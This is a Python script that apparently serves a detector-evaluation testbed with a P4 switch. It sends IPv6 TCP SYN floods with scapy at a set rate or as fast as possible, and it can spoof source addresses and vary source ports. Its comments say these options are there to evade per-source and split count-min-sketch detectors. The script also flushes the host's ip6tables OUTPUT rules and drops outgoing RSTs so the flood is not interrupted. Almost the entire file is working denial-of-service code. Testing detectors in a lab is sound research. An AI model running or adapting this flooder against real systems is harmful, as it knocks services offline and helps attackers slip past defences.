"""
attack_rate.py  --  hping3-style IPv6 SYN flood (scapy L2 injection).

hping3 is IPv4-only and this testbed is IPv6 (the P4 switch parses IPv6),
so the flooder must inject IPv6 frames -> scapy. This gives you the SAME
controls hping3 gives you:

    hping3 -S -p 80 --flood            ->  python3 attack_rate.py --flood
    hping3 -S -p 80 -i u10000          ->  python3 attack_rate.py --rate 100
    hping3 -S -p 80 -c 500 -i u5000    ->  python3 attack_rate.py --count 500 --rate 200
    hping3 -S -p 80 --rand-source      ->  python3 attack_rate.py --flood --spoof

Options:
    --rate  N     send N SYNs per second   (pps).           default: 100
    --flood       send as fast as possible (ignores --rate).
    --count N     stop after N SYNs.        (0 = unlimited)  default: 0
    --duration S  stop after S seconds.     (0 = unlimited)  default: 0
    --spoof       randomise the source IPv6 (evades per-source CMS).
    --port P      destination port.                          default: 80

Notes:
  * SYNs are raw-injected and never ACKed, so completion_ratio stays 0
    -> this is a real half-open (embryonic) flood regardless of rate.
  * The flow key excludes source port, so all SYNs from one host land in
    the SAME CMS counter; varying sport (like hping3) does not matter.
"""

import re, sys, time, random, argparse, subprocess
from scapy.all import Ether, IPv6, TCP, sendp
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

VICTIM_IP  = "2001:1:1::100"
VICTIM_MAC = "aa:00:00:00:00:00"

ap = argparse.ArgumentParser()
ap.add_argument('--rate',     type=float, default=100.0)
ap.add_argument('--flood',    action='store_true')
ap.add_argument('--count',    type=int,   default=0)
ap.add_argument('--duration', type=float, default=0.0)
ap.add_argument('--spoof',    action='store_true')
ap.add_argument('--port',     type=int,   default=80)
ap.add_argument('--rand-port', dest='rand_port', action='store_true',
                help='randomise source port every SYN (hping3 default). This '
                     'DILUTES the flow across the SYN-split detectors -> use it '
                     'to demonstrate the split-dilution evasion. Default is a '
                     'FIXED source port so the flow lands on ONE detector and '
                     'the counter accumulates (measures the detector floor).')
args = ap.parse_args()

FIXED_SPORT = 20000   # fixed src port -> one flow lands in one CMS bucket

IPV6_MAP = {'h0': '2001:1:1::100'}
IPV6_MAP.update({f'h{i}': f'2001:1:1::{i:x}' for i in range(1, 61)})

subprocess.run(['sysctl', '-w', 'net.ipv6.conf.all.disable_ipv6=0'], capture_output=True)
# drop kernel RSTs so the host doesn't cancel its own flood
subprocess.run(['ip6tables', '-F', 'OUTPUT'], capture_output=True)
subprocess.run(['ip6tables', '-A', 'OUTPUT', '-p', 'tcp',
                '--tcp-flags', 'RST', 'RST', '-j', 'DROP'], capture_output=True)


def iface_info():
    out = subprocess.run(['ip', 'link'], capture_output=True, text=True).stdout
    iface = None
    for line in out.split('\n'):
        m = re.search(r'\d+:\s+([\w-]+eth\d+)', line)
        if m:
            iface = m.group(1); break
    if not iface:
        print("ERROR: no interface"); sys.exit(1)
    mac = re.search(r'link/ether ([0-9a-f:]+)',
                    subprocess.run(['ip', 'link', 'show', iface],
                                   capture_output=True, text=True).stdout).group(1)
    r = subprocess.run(['ip', '-6', 'addr', 'show', iface], capture_output=True, text=True).stdout
    m6 = re.search(r'inet6 (2001[0-9a-f:]+)/\d+', r)
    if m6:
        ip6 = m6.group(1)
    else:
        host = iface.split('-eth')[0]
        ip6 = IPV6_MAP.get(host)
        subprocess.run(['ip', '-6', 'addr', 'add', 'nodad', ip6 + '/64', 'dev', iface],
                       capture_output=True)
    return iface, mac, ip6


def rand_src():
    return "2001:1:1::" + ":".join("%x" % random.randint(0, 0xffff) for _ in range(2))


iface, src_mac, src_ip = iface_info()
mode = 'FLOOD' if args.flood else f'{args.rate:g} pps'
stop = []
if args.count:    stop.append(f'{args.count} SYNs')
if args.duration: stop.append(f'{args.duration:g}s')
portmode = 'rand-port (diluted across split)' if args.rand_port else f'fixed-port {FIXED_SPORT}'
print(f"[attack_rate] {src_ip} -> {VICTIM_IP}:{args.port}  rate={mode}  {portmode}"
      f"{'  SPOOFED' if args.spoof else ''}  stop={stop or ['ctrl-c']}")

inter = 0.0 if args.flood else (1.0 / args.rate if args.rate > 0 else 0.0)
n = 0
t0 = time.time()
try:
    while True:
        if args.count and n >= args.count:                 break
        if args.duration and (time.time() - t0) >= args.duration: break
        s = rand_src() if args.spoof else src_ip
        sport = (1024 + (n % 64000)) if args.rand_port else FIXED_SPORT
        pkt = (Ether(src=src_mac, dst=VICTIM_MAC) /
               IPv6(src=s, dst=VICTIM_IP) /
               TCP(sport=sport, dport=args.port, flags="S", seq=1000 + n))
        sendp(pkt, iface=iface, verbose=0)
        n += 1
        if inter:
            # pace to the target rate (drift-corrected)
            target = t0 + n * inter
            slack = target - time.time()
            if slack > 0:
                time.sleep(slack)
except KeyboardInterrupt:
    pass

dt = max(0.001, time.time() - t0)
print(f"[attack_rate] done: {n} SYNs in {dt:.1f}s ({n/dt:.0f} pps actual)")
